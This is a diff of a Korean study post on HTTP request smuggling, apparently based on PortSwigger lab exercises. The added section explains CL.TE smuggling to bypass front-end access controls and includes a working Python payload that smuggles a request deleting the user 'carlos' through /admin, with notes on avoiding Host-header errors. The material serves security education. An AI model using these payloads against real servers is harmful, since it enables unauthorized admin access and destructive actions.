@@ -313,7 +313,7 @@ chunked
 
 **LAB Description :**
 
-이 문제는 Front-end와 Back-end 서버로 이루어져 있고 Back-end 서버는 chunked encoding을 지원하지 않습니다. Front-end 서버는 `GET`, `POST` 메소드 외에 다른 메소드를 이용한 요청은 거부합니다.
+이 문제는 Front-end와 Back-end 서버로 이루어져 있습니다. Front-end 서버는 `GET`, `POST` 메소드 외에 다른 메소드를 이용한 요청은 거부합니다.
 
 이 Lab을 풀려면, HTTP request smuggling 공격을 이용해서 다음 요청이 `GPOST` 메소드를 사용하게 해야 합니다.
 
@@ -367,7 +367,7 @@ print ("{:^10}".format("[*] RESPONSE"))
 print (data.decode())
 ```
 
-공격 방법은 위의 예제와 동일하지만, 이 취약점을 발견하는 데 좀 더 시간이 걸립니다. `Transfer-Encoding`를 조작해보고, **CL.TE**인지, **TE.CL**인지도 확인해봐야 합니다.
+공격 방법은 위의 예제와 동일하지만, 이 취약점을 발견하는 데 좀 더 시간이 걸립니다. `Transfer-Encoding`를 조작해보고, **CL.TE**로 작동하는지, **TE.CL**로 작동하는지도 확인해봐야 합니다.
 
 **Response :**
 
@@ -383,8 +383,68 @@ Content-Length: 27
 
 
 
-**HTTP request smuggling** 공격에 대해 알아보고 기본적인 공격방벙을 공부했는데, 좀 더 많은 문제를 풀어보고 싶으시면 링크 남겨드릴테니 풀어보시면 될 것 같습니다. **HTTP request smuggling** 공격에 대한 문제가 많지 않았던 거 같은데 여기서 공부하면 좋을 것 같습니다 :
+**HTTP request smuggling** 공격에 대해 알아보고 기본적인 공격방벙을 공부했는데, 좀 더 많은 문제를 풀어보고 싶으시면 링크 남겨드릴테니 풀어보시면 될 것 같습니다. **HTTP request smuggling** 공격에 대한 문제가 많지 않았던 거 같은데 여기서 공부하면 좋을 것 같습니다. 아래 이어서 나오는 내용들도 이 링크를 번역한 내용입니다. :
 
 > 🚀 [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
 
- 
+## Exploiting HTTP request smuggling vulnerabilities
+
+위에서는 개념과 간단한 공격에 대해서 공부했으니 이번에는 실제 여러 문제를 풀어보도록 하겠습니다. 
+
+### 😎 Using HTTP request smuggling to bypass front-end security controls
+
+어떤 어플리케이션들은 Front-end 서버에서 사용자의 요청이 악의적인 요청인지  검사하게 합니다. 요청이 검사를 통과하면 그 요청을 Back-end 서버로 포워드 해줍니다. 그럼 Back-end에서는 검사를 통과한 요청으로 인식하고, 요청을 처리합니다.
+
+접근 통제를 구현한 어플리케이션에서 권한이 없는 사용자는 `/home` 에는 접근할 수 있지만 `/admin`에는 접근할 수 없다고 가정해봅시다. 이런 경우 **HTTP request smuggling** 공격을 사용하면 권한이 없는 사용자도 `/admin` 경로에 접근할 수 있습니다 :
+
+```http
+POST /home HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: x
+```
+
+이 경우는 **CL.TE** 취약점이 발생한 경우입니다. Front-end에서는 `Content-Length` 헤더를 보고 요청을 모두 Back-end에게 포워드 해주고, Back-end에서는 `Transfer-Encoding` 헤더를 보고 `0\r\n\r\n`까지 처리합니다. 남은 부분은 처리되지 않은 상태로 남아있고, 다음 요청이 들어오면 그 요청 앞에 붙어서 처리됩니다.
+
+**Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability**
+
+**LAB Description :**
+
+Front-end, Back-end 서버로 이루어져있고 Front-end 서버는 chunked encoding을 지원하지 않습니다. `/admin`에 어드민 패널이 있고 Front-end 서버는 어드민이 아닌 사용자의 요청을 막습니다.
+
+이 문제를 풀려면 어드민 패널에 접근하는 요청을 smuggle 해서 `carlos` 사용자를 삭제하면 됩니다.
+
+**PAYLOAD :**
+
+``` python
+second_request  = b'GET /admin/delete?username=carlos HTTP/1.1\r\n'
+second_request += b'Host: localhost\r\n'
+second_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
+second_request += b'Content-Length: 10\r\n'
+second_request += b'\r\n'
+second_request += b'x='
+
+first_request  = b'POST / HTTP/1.1\r\n'
+first_request += b'Host: '+HOST.encode()+b'\r\n'
+first_request += b'Content-Length: '+str(len(second_request)+5).encode()+b'\r\n'
+first_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
+first_request += b'Transfer-Encoding: chunked\r\n'
+first_request += b'\r\n'
+first_request += b'0\r\n\r\n'
+
+smuggle_request = first_request + second_request
+```
+
+- `Admin interface only available to local users` 에러가 떠서 `Host: localhost`로 지정해줬습니다.
+
+- `Host` 헤더를 따로 지정해주니까 원래 붙는 `Host`와 중복되서 자꾸 400 에러가 뜹니다. 그래서 `\r\n`를 삽입해줘서 원래의 요청이 body가 되게 해줬습니다.
+
+`/admin`에 접근했다면 `delete`의 경로를 알 수 있고 그 경로로 요청을 보내면 됩니다.
+
